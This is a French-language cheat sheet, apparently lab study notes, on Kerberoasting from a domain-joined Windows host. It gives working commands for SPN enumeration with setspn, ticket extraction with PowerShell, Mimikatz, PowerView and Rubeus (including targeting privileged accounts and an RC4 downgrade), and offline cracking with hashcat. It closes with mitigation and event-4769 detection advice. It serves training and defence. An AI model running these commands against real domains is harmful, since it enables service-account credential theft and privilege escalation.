# Mémo — Kerberoasting depuis Windows

> Pendant Windows du [Kerberoasting Linux](memo-kerberoasting-linux.md).
> Hôte Windows joint au domaine, contexte d'un user de domaine. Domaine : `INLANEFREIGHT.LOCAL`, DC = `ACADEMY-EA-DC01`.
> Du plus **manuel** (setspn + Mimikatz) au plus **automatisé** (PowerView, **Rubeus**). Toujours cracker **offline**.

---

## 1. Méthode semi-manuelle (setspn + PowerShell + Mimikatz)

### a) Énumérer les SPN
```cmd
setspn.exe -Q */*                 # tous les SPN du domaine (ignorer les comptes machine, garder les users)
```

### b) Demander le(s) TGS en mémoire
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
- C'est exactement ce que fait Rubeus en interne (méthode Kerberoast par défaut).
- Tous les tickets d'un coup (⚠️ tire aussi les comptes machine, pas optimal) :
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### c) Extraire de la mémoire avec Mimikatz
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
- `base64 /out:true` → sortie en **base64** (sinon écrit des fichiers `.kirbi` sur le disque).

### d) Préparer le blob pour le crack (côté Linux)
```bash
echo "<base64 blob>" | tr -d \\n          # 1 seule ligne (retirer retours/espaces du wrap colonne)
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi       # → crée "crack_file"
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
> 💡 Si on saute le base64 (`kerberos::list /export` seul) → fichiers `.kirbi` directement : télécharger + `kirbi2john.py` dessus (on zappe le décodage base64).

> Lourd et lent : à garder en secours si les outils automatisés sont bloqués (les missions sont souvent time-boxées).

---

## 2. PowerView (automatisé)

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname                         # lister les comptes à SPN
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat  # TGS d'un user, format Hashcat direct
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation  # tout → CSV
```

---

## 3. Rubeus (GhostPack, le plus rapide)

```powershell
.\Rubeus.exe kerberoast /stats                       # stats sans demander de ticket (nb de comptes, etypes, année du pwd)
.\Rubeus.exe kerberoast /nowrap                       # roast tout, hash sur 1 ligne
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # cibler les comptes privilégiés (admincount=1)
.\Rubeus.exe kerberoast /user:testspn /nowrap         # cibler un user
.\Rubeus.exe kerberoast /outfile:hashes.txt           # écrire dans un fichier
```
- **`/nowrap`** = pas de wrap colonne du base64 → copier/cracker direct sans nettoyer espaces/retours.
- `/stats` : repérer un SPN dont le **pwd a été posé il y a 5+ ans** = cible juteuse (mdp faible jamais changé).
- Autres : `/creduser` + `/credpassword` (creds alternatifs), `/usetgtdeleg`, `/rc4opsec`, `/aes`, `/pwdsetbefore` + `/pwdsetafter`, `/resultlimit`, `/delay` + `/jitter` (furtivité).

---

## 4. Types de chiffrement (RC4 vs AES)

| etype | Hash commence par | Hashcat | Crack |
|-------|-------------------|---------|-------|
| **23** (RC4_HMAC) | `$krb5tgs$23$*` | `-m 13100` | **Rapide** (secondes/minutes) |
| **18** (AES-256) | `$krb5tgs$18$` | `-m 19700` | Bien **plus lent** (mais possible si mdp faible) |
| **17** (AES-128) | `$krb5tgs$17$` | `-m 19600` | Lent |

- `msDS-SupportedEncryptionTypes` (via PowerView) : `0` = non défini → **défaut RC4** ; `24` = **AES 128/256 uniquement**.
```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
- **Downgrade RC4** : `.\Rubeus.exe kerberoast /tgtdeleg` demande un ticket **RC4** même pour un compte AES
  (annonce RC4 comme seul etype supporté dans la TGS-REQ) → crack bien plus rapide.
- ⚠️ **Gotcha** : `/tgtdeleg` **ne marche pas** contre un DC **Windows Server 2019** (renvoie toujours le chiffrement
  le plus fort du compte → AES-256). Le downgrade fonctionne sur **2016 et antérieur**. (C'est pourquoi les exemples RC4/AES du module ne sont pas reproductibles dans le lab : DC en 2019.)

---

## 5. Mitigation & détection

**Mitigation :**
- Comptes de service non managés → **passphrase longue/complexe** hors wordlist.
- Préférer **MSA / gMSA** (mdp très complexes, **rotation auto**) ou comptes sous **LAPS**.
- **Pas de Domain Admins / comptes très privilégiés en SPN**.
- Restreindre **RC4** pour les requêtes Kerberos des comptes de service (à **tester**, risque de casse). Ne jamais retirer AES.

**Détection :**
- Kerberoasting = pics anormaux de **TGS-REQ / TGS-REP** (outils automatisés).
- Activer **Audit Kerberos Service Ticket Operations** (GPO) → events **4769** (ticket demandé) & **4770** (renouvelé).
- ~**10-20** requêtes TGS par compte = normal ; beaucoup de **4769** d'un même compte en peu de temps = suspect.
- Dans le 4769 : etype **`0x17`** = `23` = **RC4** → ticket crackable si mdp faible.

---

## 6. À retenir

| Besoin | Commande |
|--------|----------|
| Lister SPN (natif) | `setspn.exe -Q */*` |
| Lister SPN (PowerView) | `Get-DomainUser * -spn \| select samaccountname` |
| TGS format Hashcat (PowerView) | `Get-DomainUser -Identity <u> \| Get-DomainSPNTicket -Format Hashcat` |
| Roast rapide + 1 ligne | `Rubeus.exe kerberoast /nowrap` |
| Cibler les privilégiés | `Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` |
| Stats / cibles juteuses | `Rubeus.exe kerberoast /stats` |
| Forcer RC4 (downgrade) | `Rubeus.exe kerberoast /tgtdeleg` (❌ DC 2019) |
| Cracker RC4 (type 23) | `hashcat -m 13100 <hash> rockyou.txt` |
| Cracker AES-256 (type 18) | `hashcat -m 19700 <hash> rockyou.txt` |
| Mitigation reine | **gMSA** + pas de DA en SPN |
| Détection | event **4769** (etype `0x17` = RC4) |
